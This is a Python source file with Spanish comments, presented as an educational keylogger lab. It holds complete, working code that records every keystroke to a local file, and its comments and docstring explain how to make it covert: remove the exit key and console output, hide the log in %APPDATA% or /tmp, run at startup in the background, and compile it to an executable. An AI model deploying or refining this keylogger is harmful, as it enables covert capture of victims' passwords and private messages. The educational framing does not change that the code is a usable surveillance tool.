"""
Script: keylogger_lab
Author: Jim / Jasmina Codes(Original)
Descripcion:
    Este script es un laboratorio de pruebas para capturar entradas del teclado usando la libreria `pynput`.
    Se utiliza como ejercicio educativo para comprender como funciona un keylogger a bajo nivel.
⚠ Advertencia:
    Este script debe ser usado exclusivamente con fines educativos y eticos.
    El uso no autorizado de sofware tipo keylogger puede ser ilegal.

Requisitos:
    - Instalar pynput: pip install pynput

Nota:
    - Un keylogger real no necesita un comando para terminar o salir.
    pero para este laboratorio, lo va a tener ya que necesitamos poder detenerlo
    - Si esto fuera un programa malicioso, no utilizaria funciones como `print` que delatan la actividad
    - Si se usara para recopilar información real, **los datos deben guardarse tal como llegan**, sin formatearlos ni parsearlos.
      Es mejor desarrollar un script posterior para analizarlos, de esta manera se conserva la fidelidad original del proceso de captura.
    - la forma ideal de ejecucion de un keylogger es la de ejecutarse al iniciar la maquina o aplicacion en la que va ser usada, y tener en cuenta que este siempre activo en segundo plano y ese tipo de cosas.
    - si no esta instalado python, es mejor crear un ejecutable y asi garantizamos que corra en cualquier sistema.
"""

# Se importa el modulo necesario de la libreria `pynput`, que permite controlar y escuchar eventos del teclado.
# Desde `pynput.keyboard` importamos:
# - `Key`: para poder detectar teclas especiales (como Enter, Shift, Ctrl, etc).
# - `Listener`: Objeto que "escucha" los eventos del teclado (teclas presionadas o soltadas)
from pynput.keyboard import Key, Listener

# Se define la ruta donde se guardaran las pulsaciones. En este caso, en el mismo directorio.
# En un entonrno malicioso, este archivo se ocultaria en carpetas del sistema como %APPDATA% o /tmp
file = "./keyboard-log.txt"


# Funcion que se ejecuta al presionar una tecla.
# Convertimos la tecla a string y eliminamos comillas innecesarias.
# Luego, la guardamos en el archivo de texto definido.
def detect_key(key):
    # convertimos de objeto a string, removiendo las comillas
    key = str(key).replace("'", "")

    # Abre el archivo en modo append:
    # SI el archivo no existe, lo crea. Si existe, agrega contenido al final.
    with open(file, "a") as f:
        # 🧪 Espacio experimental:
        # Usamos `match` para manejar casos específicos de teclas especiales.
        # Esto nos permite experimentar con distintos comportamientos para cada tecla.
        # La estructura `match` facilita escalar el comportamiento sin llenar el código de `if/else`.
        match key.lower():
            case "key.enter":
                # ENTER se traduce a un salto de linea
                f.write("\n")
            case "key.shift":
                # SHIFT no se guarda porque no representa un caracter por si solo.
                # En un keylogger mas avanzado, se puede usar para detectar mayusculas o combinaciones.
                f.write("")
            case "key.space":
                # SPACE se guarda como un espacio.
                f.write(" ")
            case "key.tab":
                # TAB se guarda como un tabulador, util para ver cambios de contexto en escritura.
                f.write("\t")
            case "key.backspace":
                # BACKSPACE es especial: debe simular el borrado del caracter anterior.
                # Este bloque experimental explora como modificar el archivo:
                # - Primero lo leemos completo
                # - Luego vamos al inicio con `seek(0)` para sobreescribirlo.
                # - Finalmente, reescribimos el contenido sin el ultimo caracter (`[:-1]`).
                # ⚠ Esta tecnica funciona bien en archivos pequeños o de prueba,
                # pero no es eficiente ni segura para archivos grandes o concurrentes
                with open(file, "r+") as f:
                    content = f.read()  # Leemos el contenido actual
                    f.seek(0)  # Volvemos al principio
                    f.write(content[:-1])  # reescribimos sin el ultimo caracter
                    f.truncate()  # eliminamos cualquier sobrante del final
            case _:
                # para todas las demas teclas (letras, numeros, signos), se guardan tal cual
                f.write(key)

        # 🕒 Este fragmento venia del codigo anterior:
        # Escribia cada tecla en una linea nuevas.
        # f.write(key + "\n")
        # Lo dejamos comentado como referencia del proceso evolutivo del script

    # Debug en consola:
    # esto es util durante el desarrollo para ver que se detectan correctamente las teclas.
    print("Key detected {0}".format(key))


# Funcion que se ejecuta al soltar una tecla
# Si se suelta la tecla Esc, se detiene el listener y termina el programa
def exit(key):
    if key == Key.esc:
        print("Saliendo del programa...")
        return False  # Esto detiene el listener


# Funcion principal que lanza el listener del teclado
# Mientras este activo, detecta teclas presionadas y soltadas
def main():
    # Se inicia el Listener con las funciones definidas:
    # - on_press se ejecuta al precionar una tecla.
    # - on_release se ejecuta al soltar una tecla.
    with Listener(on_press=detect_key, on_release=exit) as listener:
        listener.join()  # join() hace que el hilo principal espere hasta que el listener termine.


# Este bloque asegura que el codigo solo se ejecute si el archivo se ejecuta directamente, y no si se importa como modulo en otro script
if __name__ == "__main__":
    main()
